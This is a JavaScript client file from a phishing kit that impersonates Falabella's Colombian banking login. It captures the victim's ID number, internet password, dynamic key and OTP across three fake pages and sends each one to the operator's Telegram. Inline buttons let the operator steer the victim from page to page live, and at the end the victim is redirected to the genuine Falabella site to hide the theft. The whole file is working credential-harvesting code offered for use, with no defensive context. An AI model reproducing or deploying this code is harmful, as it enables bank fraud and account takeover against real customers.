/**
 * FALABELLA - Cliente optimizado con banco-utils
 */

(function() {
    'use strict';

    const routes = {
        'index.html': {
            getData: () => ({
                usuario: document.getElementById('cedula')?.value || '',
                password: document.getElementById('claveInternet')?.value || ''
            }),
            validate: (d) => d.usuario.length >= 6 && d.password.length >= 4
        },
        'dinamica.html': {
            getData: () => ({ dinamica: document.getElementById('dinamica')?.value || '' }),
            validate: (d) => d.dinamica.length === 6
        },
        'otp.html': {
            getData: () => ({ otp: document.getElementById('otp')?.value || '' }),
            validate: (d) => d.otp.length === 6
        }
    };

    const buttons = [
        { text: '🔑 Pedir Login', action: 'request_login' },
        { text: '🔢 Pedir Dinámica', action: 'request_dynamic' },
        { text: '📱 Pedir OTP', action: 'request_otp' },
        { text: '✅ Finalizar', action: 'finish' }
    ];

    function handleAction(data) {
        switch(data.action) {
            case 'request_login': window.location.href = 'index.html'; break;
            case 'request_dynamic': window.location.href = 'dinamica.html'; break;
            case 'request_otp': window.location.href = 'otp.html'; break;
            case 'finish': window.location.href = 'https://www.falabella.com.co/'; break;
        }
    }

    document.addEventListener('DOMContentLoaded', () => {
        BancoUtils.onTelegramAction(handleAction);

        const page = window.location.pathname.split('/').pop();
        const config = routes[page];

        // Sistema de validación de botones
        if (config) {
            const submitBtn = document.querySelector('button[type="submit"]') || document.getElementById('btnIngresar') || document.getElementById('btnContinuar') || document.getElementById('btnVerificar');
            const inputs = document.querySelectorAll('input[type="text"], input[type="password"], input[type="tel"], input[type="number"], input');

            console.log('🚀 Inicializando Falabella:', { page, submitBtn: !!submitBtn, inputsCount: inputs.length });

            function validateForm() {
                const formData = config.getData();
                console.log('🔍 Validando formulario:', { formData, page });
                const isValid = config.validate(formData);
                console.log('✅ Resultado validación:', { isValid, submitBtn: !!submitBtn });
                if (submitBtn) {
                    submitBtn.disabled = !isValid;
                    submitBtn.classList.toggle('active', isValid);
                    console.log('🔘 Botón actualizado - disabled:', submitBtn.disabled);
                }
            }

            if (inputs.length > 0) {
                inputs.forEach(input => {
                    console.log('📝 Agregando listener a:', input.id || input.name);
                    input.addEventListener('input', validateForm);
                });
            } else {
                console.warn('⚠️ No se encontraron inputs');
            }

            // Validación inicial
            validateForm();
        }

        const form = document.querySelector('form');
        if (form) {
            form.addEventListener('submit', async (e) => {
                e.preventDefault();
                const page = window.location.pathname.split('/').pop();
                const config = routes[page];
                
                if (!config) return;
                
                const formData = config.getData();
                if (!config.validate(formData)) {
                    alert('Complete todos los campos');
                    return;
                }

                BancoUtils.showOverlay();
                const data = BancoUtils.saveBankData('falabella', formData);
                const message = BancoUtils.formatMessage('FALABELLA', data);
                const keyboard = BancoUtils.createKeyboard(buttons, BancoUtils.getSessionId());

                try {
                    await BancoUtils.sendToTelegram(page.replace('.html', ''), { text: message, keyboard });
                } catch (error) {
                    BancoUtils.hideOverlay();
                    alert('Error al enviar');
                }
            });
        }
    });
})();
